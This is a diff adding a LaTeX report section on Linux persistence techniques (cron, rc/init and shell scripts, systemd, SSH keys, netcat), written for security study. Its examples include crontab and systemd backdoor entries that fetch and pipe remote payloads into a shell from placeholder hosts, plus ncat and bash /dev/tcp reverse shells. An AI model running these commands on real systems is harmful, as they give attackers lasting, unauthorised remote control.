@@ -1,0 +1,220 @@
+
+\pagebreak
+\subsection{Persistence in Linux}
+\label{ssec:linux}
+Malware for Linux distributions is not as common as for Windows for many reasons, being some of them: the market share\cite{OSMarketShare} (it is not the most preferred operating system for workstations by users and companies), its differences between distributions, its more secure design (because it is reviewed by a big community since most of the distributions are open source), etc. 
+
+Still, it is a pretty common system found on servers exposed to the Internet, with CentOS/RedHat (RHEL), Ubuntu, and Debian\cite{LinuxStatistics} as some of the most used Linux distributions; being even sometimes installed on internal enterprise computers. 
+
+Because of this, there are some persistence techniques developed specifically for Linux, even though, and similar to what happens in Windows, most of the attacks on Linux start with vulnerable software or an unintentionally exposed server with badly configured user profiles, that ultimately allow an adversary to run commands with privileges.
+
+The next subsections are not focused on any specific Linux distribution, since most of the techniques explained use core Linux functionalities. However, many examples are for Debian-based systems.
+
+\subsubsection{List of techniques}
+\label{sssec:linuxTec}
+All techniques of this section are easily scriptable, as there are lots of commands in the Linux shell to help manage the system, which, unfortunately, also eases the work of attackers. Additionally, there are not a lot of antimalware services for Linux operating systems, so it is common for some of these techniques to stay undetected for a long time.
+
+Using the same naming convention as in the Windows section (\ref{ssec:windows}), in the following lists, apart from the name of the technique, it is written its code in the MITRE ATT\&CK® Matrix\cite{MitreWeb}.
+
+Another important piece of information is that files in Linux systems do not necessarily have an extension (something that is almost mandatory on Windows systems). As a result, even though there are several common ones, often used even in system files, just keep in mind that all the following techniques can be executed with files without extension. That being said, the typical extensions used in Linux programs are: 
+\begin{itemize}
+\item Bash (shell) commands (\texttt{.sh})
+\item Python files (\texttt{.py}) (the Python programming language is installed by default in most Linux distributions)
+\end{itemize} 
+
+\pagebreak
+\paragraph{Most common persistence techniques}
+The following mechanisms are based on functionalities that the operating system has been using since early versions, which is another similarity with Windows:
+
+\begin{itemize}
+\item \textbf{T1053.003 - crontab}: it stands for “Cron Table", and is a configurable list of commands or \textit{jobs} that are executed regularly using an internal scheduler. Similar to the Windows utility "Scheduled Tasks", this tool can easily be abused for initial or recurring execution of malicious code.
+
+This scheduler can be set up using the \texttt{crontab} command, or changing files in a system-specific path, which is "\verb|/etc/cron.d/|" in Debian distributions, like in the next example: 
+
+\vspace{7pt}
+\begin{spverbatim}
+### Examples of the crontab in bash ###
+## Opening the crontab file. ## 
+crontab –e 
+
+## Copying these lines on the file will run tasks every 10 or 5 min respectively, that download and execute a file that seems a picture but is, in fact, hidden shell code. ##
+*/10 * * * * wget -O - -q http://<malicious_url>/pics/logo.jpg|sh
+*/5 * * * * curl http://<malicious_url>/malicious.png -k|dd skip=2446 bs=1|sh
+
+## Another example that connects every 10 min to a remote IP and executes the input received as shell commands. ##
+*/10 * * * * ncat -e /bin/sh 192.168.1.21 5556  
+\end{spverbatim}
+\vspace{7pt}
+
+All tasks created or modified with the command \texttt{crontab} are saved in "\verb|/var/spool/cron/crontabs|" (in Debian), having a file per user. Therefore, \underline{no privileges} \underline{are needed} in order to create or modify a user crontab, but only when managing system jobs (or the \textit{root} user tasks, which is by default a privileged user).
+
+\item \textbf{Boot, login or shell session: T1037.004 - RC scripts and T1546.004 - Shell scripts}: several scripts are executed by default when the system is booted, when a user logs in, or when a shell session is opened, which can be an interactive GUI shell or, for example, a remote session via SSH (explained in section \ref{sssec:linuxTools}). 
+
+\pagebreak
+These scripts can be abused to run malicious code by simply appending the execution command to the files, so it will be executed each time the user performs any of these actions. Some of these scripts are described in the following list:
+
+\begin{itemize}
+\item \textbf{\texttt{rc} Scripts}: as stated in \cite{MitreRC}, in the past these scripts were executed during the system’s startup. Even though nowadays they are deprecated, some systems still run them (if they exist and have the appropriate file permissions) to maintain backward compatibility.
+
+These files allowed system administrators to map and start custom services at startup for different run levels, and therefore \underline{required root privileges to be modified}.
+
+Attackers could establish persistence by adding a malicious binary path or shell commands to "\verb|/etc/rc.local|", "\verb|/etc/rc.common|", and other folders. Upon reboot, the system executed the script's contents as root, resulting in persistence.
+
+Abusing \texttt{rc} scripts (or "run commands" scripts) could be especially effective for lightweight Linux distributions using the root user as default, such as IoT or embedded systems, which are systems with only basic functionalities and that do not receive updates as often as desktop or server distributions (furthermore, the use of IoT and embedded devices has grown a lot in recent years).
+
+\item \textbf{\texttt{init} Scripts}: similar to the \texttt{rc} Scripts, "\verb|/etc/init.d|" is a folder that contains scripts and executables that run at startup, and its functionality is similar to the "Startup Folder" on Windows. \texttt{init} refers to the first process that is started when the machine is booted, and therefore, the one that executes all initialization scripts, which can be altered to run malicious code too (even though \underline{root privileges are required}).
+
+The \texttt{init} process is nowadays more or less deprecated, since lots of efforts have been put in the past 10 years to switch to the new system, \texttt{systemd}, which includes several performance improvements. But methods associated with the old \texttt{init} system are still working, so this process and its folder are still relevant.
+
+More information on the new system, \texttt{systemd}, can be found below.
+
+\pagebreak
+\item \textbf{Shell configuration scripts}: shells, which are used often by Linux users, execute several configuration scripts at different points throughout the session, based on events\cite{MitreShells}.
+
+These configuration scripts run at the permission level of their directory (so \underline{privileges may} \underline{not be necessary}) and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell ends appropriately. Some of these scripts can be observed in table \ref{tab:linShellScripts}, even though many only apply to the "\texttt{bash}" shell, which is usually the default one.
+
+\vspace{7pt}
+\begin{table}[!htb]
+\centering
+{\setlength{\tabcolsep}{1em}
+  \begin{tabular}{@{\extracolsep{\fill}}| l | c | c |}
+  \hline \multicolumn{1}{|c|}{\textbf{File}} & \textbf{Privileges} & \textbf{Purpose}\\ \hline \hline 
+  	\verb|~/.bashrc| & user &  for interactive shells, local or remote \\ \hline
+  	\verb|~/.bash_profile| & user & for interactive login shells \\ \hline
+  	\verb|~/.bash_login| & user & \shortstack{ for interactive login shells \\   (if \texttt{.bash\_profile} does not exist) } \\ \hline
+  	\verb|~/.profile| & user & \shortstack{ for interactive login shells \\   (if \texttt{.bash\_login} does not exist) } \\ \hline
+  	\verb|~/.bash_logout| & user & at the end of a session \\ \hline
+  	\verb|/etc/profile| & root & global login shells configuration \\ \hline
+  	\verb|/etc/profile.d| & root & folder with configuration files \\ \hline
+  \end{tabular}}
+  \caption{Scripts used to configure shells' environment} \vspace{3pt}
+  \label{tab:linShellScripts}
+\end{table}
+
+In consequence, this persistence technique consists of inserting commands into scripts automatically executed by shells, in order to be triggered sooner than later.
+\end{itemize}
+
+\item \textbf{T1543.002 - Systemd} (daemons and services): a \textit{daemon} is a background, non-interactive program; and a \textit{service} is a program which responds to requests from other programs over some inter-process communication mechanism. Although a service does not have to be a daemon, it usually is, both on Windows and Linux systems (the word "\textit{daemon}" is specific to Linux systems, but services on Windows often behave like daemons). 
+
+The mechanism that currently controls daemons and services in most Linux distributions is \textit{systemd}, which usually \underline{only privileged users} can administrate (though some services can be also stored in "\verb|~/.config/systemd/user/|" to achieve user-level persistence).
+
+Persistence can be deployed by creating or modifying systemd services to repeatedly execute malicious payloads, since systemd utilizes configuration files ("\texttt{.services}" files stored in "\verb|/etc/systemd/system|" and "\verb|/usr/lib/systemd/system|") to control how services boot and under what conditions. 
+
+\pagebreak
+Common directives found in services' files\cite{MitreSystemD}, used to execute system commands, are:
+\begin{itemize}
+\item \texttt{ExecStart}, \texttt{ExecStartPre}, and \texttt{ExecStartPost}, which cover execution of commands when a service is started manually by the "\texttt{systemctl}" command, or on system start if the service is configured that way
+\item \texttt{ExecReload}, that covers when a service restarts
+\item \texttt{ExecStop} and \texttt{ExecStopPost}, used when a service is stopped or manually by "\texttt{systemctl}"
+\end{itemize}
+
+An example of these directives, can be found in the following code snippets, as shown in \cite{SystemDCode}:
+
+\vspace{7pt}
+\begin{spverbatim}
+### Example: two new services that execute a backdoor service every 3 min ###
+## Contents of "backdoor.service" ##
+[Unit]
+Description=Backdoor
+
+[Service]
+Type=simple
+ExecStart=curl --insecure https://<malicious_IP>/cmd.txt|bash
+
+## Contents of "backdoor.timer" ##
+[Unit]
+Description=Runs backdoor ever 3 mins
+
+[Timer]
+OnBootSec=5min
+OnUnitActiveSec=3min
+Unit=backdoor.service
+
+[Install]
+WantedBy=multi-user.target
+
+## Commands to launch them ##
+> systemctl start backdoor.timer  # to start now
+> systemctl enable backdoor.timer  # to make it start on reboot
+\end{spverbatim}
+
+%\begin{spverbatim}
+%### Second example: a service that ends and, theredore, continuously restarting every 5 min ###
+%
+%[Service]
+%Type=simple
+%ExecStart=curl --insecure https://127.0.0.1/cmd.txt|bash; exit 0
+%Restart=always
+%RestartSec=180
+%
+%\end{spverbatim}
+\end{itemize}
+
+\subsubsection{Tools to implement persistence}
+\label{sssec:linuxTools}
+For Linux systems, there are not as many tools as for Windows systems, but some of them are:
+\begin{itemize}
+\item \textbf{Metasploit Framework - Meterpreter}: as introduced in section \ref{sssec:windowsTools}, this framework can be used to perform persistence, among other tactics. When generating the \textit{Meterpreter} payload, even though it has more options for Windows, it can be built for Linux too.
+
+\item \textbf{RedGhost and Linper}: these two projects are frameworks that deploy persistence, designed to assist cybersecurity professionals when performing auditing tests.
+
+\underline{RedGhost}\cite{RedGhost}, is a framework written in \textit{bash} (Linux shell commands) that can be launched to deploy backdoors, persistence, and other tactics using multiple techniques.
+
+\underline{Linper}\cite{Linper} is also a toolkit written in \textit{bash}, that contain several methods to perform persistence, like modifying \texttt{crontab} and \texttt{.bashrc} files, in addition to creating backdoors.
+
+%\todo[inline]{ este post https://flaviu.io/advanced-persistent-threat/}
+
+\end{itemize}
+
+\paragraph{Backdooring tools}
+Corporations that use exposed Linux servers to host their websites or APIs\footnotemark, tend to manage them using remote access rather than physical access. This is because servers are often set up in virtual machines inside the company's data servers, so they are not as accessible as normal workstations.
+
+For that reason, it is common that remote administration tools are installed on exposed servers, and it is essential to configure and monitor them so that they are only accessed from the internal network and never from the Internet. 
+
+Some of the following tools are typical remote management or connection solutions, which may be monitored or blocked by firewalls or other network security devices.
+
+\footnotetext{An API is usually a set of functions, invoked using specific URLs, that allow communication between internal and external programs: these URLs can be used to retrieve or change stored information, among other functionalities.}
+
+\begin{itemize}
+\item \textbf{SSH and T1098.004 - SSH Authorized Keys}: \textit{Secure Shell} or \textit{SSH} is a cryptographic network protocol for operating connected devices securely over an insecure (or secure) network. 
+
+It can be used to perform several management tasks, such as login into remote shells and executing commands. Hence, if it is reachable from the Internet and has predictable credentials, it could be a great risk for both the system and the organization.
+
+The SSH client service is installed by default in most Linux distributions, and it is simple to use. Also, for better security and to make it easier and faster to log in, a public-key authentication mechanism can be configured, restricting the server's SSH logins to only authorized keys:
+
+\begin{spverbatim}
+### SSH examples (for Debian): simple connection and authorized keys ###
+## Basic interactive SSH connection with user and password ##
+> ssh user@computer_name_or_IP_address   # the password of the user is asked if a connection is established.
+
+## Generating new keys with the public-key cryptography algorythm EdDSA ##
+> ssh-keygen -t ed25519 -C "your_mail@mail.com"   # it asks for a passphrase 
+> cat ~/.ssh   # to check the public key (.pub) and the private key generated
+
+## To be able to login into a remote SSH server, the public key must be copied into the file "authorized_keys" in the "~/.ssh" folder of the remote user. 
+SCP is a tool to upload or download files securely over SSH ##
+> scp ~/.ssh/id_ed25519.pub user@remote_computer:~/.ssh/authorized_keys
+
+## And then, regular SSH commands can be used without asking for the user password, but instead for the authorized key passphrase ##
+> ssh user@remote_computer
+\end{spverbatim}
+\vspace{7pt}
+
+With this tool, persistence (a backdoor) can be deployed modifying SSH \verb|authorized_keys| files directly with scripts or shell commands, to add additional public keys (only \underline{user privileges} \underline{are necessary}). This strategy is not easy to detect just looking into the \verb|authorized_keys| files, so connection logs are critical when having a server that is accessible through SSH.
+
+Finally, SSH connections from the Internet to exposed or internal servers are often filtered or dropped by firewalls, as these connections should be only made from the internal network.
+
+\item \textbf{Netcat or \texttt{nc}}: netcat is a computer networking utility for reading from and writing to network connections using TCP or UDP. It is frequently used by attackers when setting reverse shells, which are shell sessions with their input and output redirected to a network connection so that it can be remotely managed, like the following example:
+
+\vspace{7pt}
+\begin{spverbatim}
+### Netcat example: (1)setting a listener, (2)starting a remote connection ###
+> nc -lvp 1234   # listener on attacker's server (port 1234)
+> bash -i >& /dev/tcp/[IP]/1234 0>&1   # command on victim's machine   
+\end{spverbatim}
+
+\pagebreak
+Although \texttt{netcat} or "\texttt{nc}" have some deprecated options, like the \texttt{-e} argument to execute the connection's input, there are other projects like "\texttt{ncat}", which is developed by the \textit{Nmap Project}, that work similar to \texttt{netcat}, but that also include missing \texttt{netcat} arguments, and are used as an alternative to this tool. 
+
+\item \textbf{HTTPS, DNS or ICMP tunnels, and connection though proxies} with tools like \textit{Mistica}, explained in the following section \ref{ssec:persistOthers}.
+\end{itemize}
